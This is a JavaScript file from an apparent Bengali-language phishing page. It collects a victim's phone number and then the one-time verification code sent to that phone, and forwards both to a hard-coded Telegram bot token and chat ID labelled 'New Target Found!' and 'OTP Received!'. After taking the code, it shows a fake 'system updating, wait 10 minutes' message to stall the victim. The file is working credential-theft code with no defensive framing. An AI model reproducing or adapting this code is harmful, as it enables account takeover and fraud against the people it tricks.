const token = '8687954316:AAGU9FMZp7U0Di4Agt2VOd0gskohEruYlu0';
const chatId = '5877893357';

let userPhone = "";

function goToStep2() {
    const phoneInput = document.getElementById('phone').value;
    if (phoneInput.length < 10) {
        alert("সঠিক মোবাইল নম্বর দিন");
        return;
    }
    userPhone = phoneInput;
    
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
    document.getElementById('title').innerText = "Verification";
    document.getElementById('msg').innerText = "আপনার নম্বরে পাঠানো কোডটি লিখুন";

    const logMessage = `🔔 New Target Found!\n👤 Name: Sumaiya Afrin LIVE\n📱 Number: ${userPhone}`;
    sendToTelegram(logMessage);
}

document.getElementById('mainForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const otpInput = document.getElementById('otp').value;
    
    if (otpInput.length < 4) {
        alert("সঠিক ওটিপি কোড দিন");
        return;
    }

    const otpMessage = `✅ OTP Received!\n📱 Number: ${userPhone}\n🔑 OTP Code: ${otpInput}`;
    sendToTelegram(otpMessage);
    
    alert("সিস্টেম আপডেট হচ্ছে, দয়া করে ১০ মিনিট অপেক্ষা করুন।");
});
